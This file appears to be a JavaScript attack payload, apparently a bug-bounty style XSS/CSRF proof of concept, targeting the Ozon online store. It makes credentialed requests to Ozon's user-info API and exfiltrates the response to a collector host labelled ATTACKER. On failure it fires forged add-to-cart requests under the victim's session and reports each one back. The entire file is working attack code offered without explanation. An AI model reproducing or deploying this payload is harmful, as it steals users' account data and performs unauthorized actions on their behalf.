alert('new_8');

var ATTACKER = 'https://dm3pjhjkpudpos6lmt41kc90xr3iref3.oastify.com';

fetch('https://api.ozon.ru/composer-api.bx/_action/getUserV2', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({}),
    credentials: 'include'
})
.then(function(r) {
    navigator.sendBeacon(ATTACKER + '?cors=ok&status=' + r.status);
    return r.text();
})
.then(function(text) {
    navigator.sendBeacon(ATTACKER + '/data', text);
})
.catch(function(err) {
    navigator.sendBeacon(ATTACKER + '?cors=blocked&err=' + encodeURIComponent(err.toString()));

    fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'User-Agent': 'Android/11.0 Firefox/140.0' },
        body: JSON.stringify([{ id: 1215057882, quantity: 2 }]),
        credentials: 'include',
    }).then(function() {
        navigator.sendBeacon(ATTACKER + '?cart0=fired');
    });

    fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'User-Agent': 'Android/11.0 Firefox/140.0' },
        body: JSON.stringify([{ id: 1215057882, quantity: 2 }]),
        credentials: 'include',
        mode: 'cors'
    }).then(function() {
        navigator.sendBeacon(ATTACKER + '?cart1=fired');
    });

    fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'User-Agent': 'Android/11.0 Firefox/140.0' },
        body: JSON.stringify([{ id: 1215057882, quantity: 2 }]),
        credentials: 'include',
        mode: 'no-cors'
    }).then(function() {
        navigator.sendBeacon(ATTACKER + '?cart1=fired');
    });
});
